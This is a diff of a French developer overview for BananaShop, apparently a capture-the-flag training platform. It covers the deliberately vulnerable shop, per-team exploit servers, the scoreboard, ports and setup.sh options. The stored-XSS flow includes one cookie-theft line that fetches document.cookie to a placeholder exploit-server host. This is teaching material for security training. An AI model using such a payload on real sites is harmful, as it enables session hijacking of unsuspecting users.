@@ -4,18 +4,20 @@ Vue d'ensemble technique pour les développeurs souhaitant comprendre, modifier 
 
 ## Architecture globale
 
-![Architecture](architecture.svg)
+![Architecture](../architecture.svg)
 
 La plateforme se compose de **4 services** déployés dans Docker, répliqués par équipe (sauf le dashboard qui est central) :
 
-| Service | Stack | Port | Rôle |
-|---------|-------|------|------|
-| **BananaShop Client** | React 18, Vite 5, Tailwind 3 | :300N | SPA e-commerce vulnérable |
-| **BananaShop Server** | Express 4, better-sqlite3 | :3000 (interne) | API REST avec 14 vulnérabilités OWASP |
-| **Exploit Server** | Express 4, SSE, ws, React 18 | :400N | QG de l'équipe (webhook, academy, flags) |
-| **Dashboard** | Express 4, ws (WebSocket), React 18 | :5000 | Scoreboard temps réel + admin |
+| Service | Stack | Port interne | Rôle |
+|---------|-------|--------------|------|
+| **BananaShop Client** | React 18, Vite 5, Tailwind 3 | 3000 (servi par le serveur) | SPA e-commerce vulnérable |
+| **BananaShop Server** | Express 4, better-sqlite3 | 3000 | API REST avec 14 vulnérabilités OWASP |
+| **Exploit Server** | Express 4, SSE, ws, React 18 | 4000 | QG de l'équipe (webhook, academy, flags) |
+| **Dashboard** | Express 4, ws (WebSocket), React 18 | 5000 | Scoreboard temps réel + admin |
 
 En Docker, le client et le serveur BananaShop sont bundlés dans un seul conteneur (`Dockerfile.site`). En dev local, ce sont deux processus séparés (Vite :5173 + Express :3001).
+
+> Les ports **internes** (3000/4000/5000) sont fixes et utilisés pour la communication inter-conteneurs. Les ports **exposés sur l'hôte** sont entièrement configurables via `setup.sh` (option `--port`) — voir la section [Docker](#docker).
 
 ---
 
@@ -157,15 +159,15 @@ secrets     (id, key, value)  -- contient le flag SQLI_UNION
 ### 1. Flux principal (participant)
 
 ```
-Navigateur ──HTTP──> BananaShop Client (:300N)
+Navigateur ──HTTP──> BananaShop Client
                          │
                          │ /api/*
                          ▼
-                    BananaShop Server (:3000)
+                    BananaShop Server (:3000 interne)
                          │
                     ┌────┴────┐
                     ▼         ▼
-               SQLite    Dashboard (:5000)
+               SQLite    Dashboard (:5000 interne)
                          POST /api/capture
                          POST /api/teams/register
 ```
@@ -173,7 +175,7 @@ Navigateur ──HTTP──> BananaShop Client (:300N)
 ### 2. Flux exploit-server
 
 ```
-Navigateur ──HTTP──> Exploit Server (:400N)
+Navigateur ──HTTP──> Exploit Server (:4000 interne)
                          │
                     ┌────┼────────────┐
                     ▼    ▼            ▼
@@ -181,14 +183,14 @@ Navigateur ──HTTP──> Exploit Server (:400N)
               proxy vers site    détecte JWT volé   broadcast temps réel
                     │                 │
                     ▼                 ▼
-              BananaShop Server   Dashboard (:5000)
+              BananaShop Server   Dashboard (:5000 interne)
                                   POST /api/capture (cookie theft)
 ```
 
 ### 3. Flux dashboard
 
 ```
-Dashboard (:5000)
+Dashboard (:5000 interne)
     │
     ├── WebSocket /ws ──broadcast──> Navigateurs (scoreboard projeté)
     │                                Exploit Servers (annonces → SSE → étudiants)
@@ -208,7 +210,7 @@ Attaquant poste <script> dans un avis (Stored XSS)
 Victime visite la page produit
     │
     ▼
-Script s'exécute : fetch("http://exploit-server:400N/log?c=" + document.cookie)
+Script s'exécute : fetch("http://<exploit-server-équipe>/log?c=" + document.cookie)
     │
     ▼
 Exploit Server détecte le JWT (regex eyJ...) dans /log
@@ -234,7 +236,7 @@ Auto-POST vers Dashboard /api/capture avec flag COOKIE_THEFT
 | Variable | Défaut | Description |
 |----------|--------|-------------|
 | `PORT` | 4000 | Port Express |
-| `TEAM_PASSWORD` | team | Mot de passe de l'équipe |
+| `TEAM_PASSWORD` | team | Mot de passe de l'équipe (généré aléatoirement par `setup.sh`) |
 | `SITE_URL` | http://localhost:3001 | URL du site BananaShop |
 | `DASHBOARD_URL` | http://localhost:5000 | URL du dashboard |
 | `TEAM_NAME` | Unknown Team | Nom de l'équipe |
@@ -244,9 +246,9 @@ Auto-POST vers Dashboard /api/capture avec flag COOKIE_THEFT
 | Variable | Défaut | Description |
 |----------|--------|-------------|
 | `PORT` | 5000 | Port Express + WebSocket |
-| `ADMIN_PASSWORD` | admin | Mot de passe panel admin |
-| `EVENT_TITLE` | BananaShop CTF | Titre sur le scoreboard |
-| `HINT_PENALTY` | 3 | Points retirés par indice |
+| `ADMIN_PASSWORD` | admin | Mot de passe panel admin (généré aléatoirement par `setup.sh`) |
+| `EVENT_TITLE` | BananaShop CTF | Titre sur le scoreboard (option `--title`) |
+| `HINT_PENALTY` | 3 | Points retirés par indice (option `--hint-penalty`) |
 
 ### Build-time (Vite)
 
@@ -296,8 +298,8 @@ cd dashboard && npm run dev               # server :5000 + Vite :5174
 
 ### Dockerfiles (tous multi-stage)
 
-| Dockerfile | Etape build | Etape runtime | Port |
-|------------|-------------|---------------|------|
+| Dockerfile | Etape build | Etape runtime | Port interne |
+|------------|-------------|---------------|--------------|
 | `Dockerfile.site` | Vite build du client | Express sert le build + API | 3000 |
 | `Dockerfile.exploit` | Vite build du client exploit | Express + SSE + client statique | 4000 |
 | `Dockerfile.dashboard` | Vite build du client dashboard | Express + WebSocket + client statique | 5000 |
@@ -306,10 +308,31 @@ Base image : `node:20-alpine`. Le site nécessite `python3 make g++` pour compil
 
 ### Génération
 
+`setup.sh` génère le `docker-compose.yml`, les `credentials.json` / `credentials.html` (cartes imprimables) et un mot de passe admin aléatoire.
+
 ```bash
-./setup.sh 6              # 6 équipes
-./setup.sh 6 --deploy     # + docker compose up --build -d
+./setup.sh                 # 4 équipes (défaut), valeurs par défaut
+./setup.sh 6 --deploy      # 6 équipes + docker compose up --build -d
+./setup.sh -p              # réaffiche les mots de passe générés (credentials.json)
 ./setup.sh --reset         # supprime conteneurs, volumes, fichiers générés
+./setup.sh -h              # aide complète
+```
+
+#### Options de configuration
+
+| Option | Défaut | Description |
+|--------|--------|-------------|
+| `--port N` | 44000 | Port de départ exposé sur l'hôte (allocation contiguë, voir ci-dessous) |
+| `--title "TEXTE"` | BananaShop CTF | Titre affiché sur le dashboard (`EVENT_TITLE`) |
+| `--hint-penalty N` | 3 | Points retirés par indice utilisé (`HINT_PENALTY`) |
+| `--nantes-hack 0\|1` | 1 | Active/désactive le branding Nantes@Hack (`VITE_NANTES_HACK`) |
+| `--deploy` | - | Build & démarre les conteneurs après génération |
+
+Chaque option à valeur accepte les deux formes : `--port 1000` ou `--port=1000`.
+
+```bash
+# Exemple complet
+./setup.sh 6 --title "Nantes@Hack CTF" --hint-penalty 5 --nantes-hack 1 --port 44000 --deploy
 ```
 
 Le `docker-compose.yml` généré inclut :
@@ -317,15 +340,22 @@ Le `docker-compose.yml` généré inclut :
 - Limites mémoire (256MB site/dashboard, 128MB exploit)
 - Volumes persistants (`dashboard-data`, `exploit-teamN-data`)
 - `restart: unless-stopped`
-- Bloc `x-event-config` pour la configuration éditable
+- Bloc `x-build-args` (branding) et `x-event-config` (titre, pénalité, mot de passe admin) pour la configuration éditable
 
-### Ports exposés (N = numéro d'équipe)
+### Attribution des ports exposés
 
-| Service | Port |
-|---------|------|
-| Dashboard | 5000 |
-| Site team N | 3000 + N |
-| Exploit team N | 4000 + N |
+Les ports exposés sur l'hôte sont attribués de façon contiguë à partir du port de départ (`--port`, défaut `44000`) :
+
+| Service | Port exposé |
+|---------|-------------|
+| Dashboard | `START_PORT` |
+| Site team 1 | `START_PORT + 1` |
+| Exploit team 1 | `START_PORT + 2` |
+| Site team 2 | `START_PORT + 3` |
+| Exploit team 2 | `START_PORT + 4` |
+| … | … |
+
+Les URLs et mots de passe effectifs de chaque équipe sont écrits dans `credentials.json` / `credentials.html` à la génération.
 
 ---
 
